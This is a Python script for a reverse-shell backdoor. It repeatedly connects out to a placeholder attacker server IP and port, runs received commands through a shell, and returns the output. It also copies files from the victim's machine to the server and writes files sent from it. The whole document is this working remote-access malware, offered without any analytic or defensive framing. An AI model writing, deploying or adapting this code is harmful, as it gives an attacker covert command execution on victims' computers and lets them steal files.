import socket
import time
import subprocess
import json
import os

def reliable_send(data):
    """Send data reliably by encoding it as JSON."""
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    """Receive data reliably by decoding JSON"""
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    """Establish a connection to the server."""
    while True:
        time.sleep(20)
        try:
            s.connect(('ENTER_SERVER_IP_HERE', ENTER_PORT_HERE))
            shell()
            s.close()
            break
        except:
            connection()

def upload_file(file_name):
    """Upload a file to the server."""
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    """Download a file from the server."""
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def shell():
    """Main shell function to receive and execute commands."""
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Establish connection
connection()
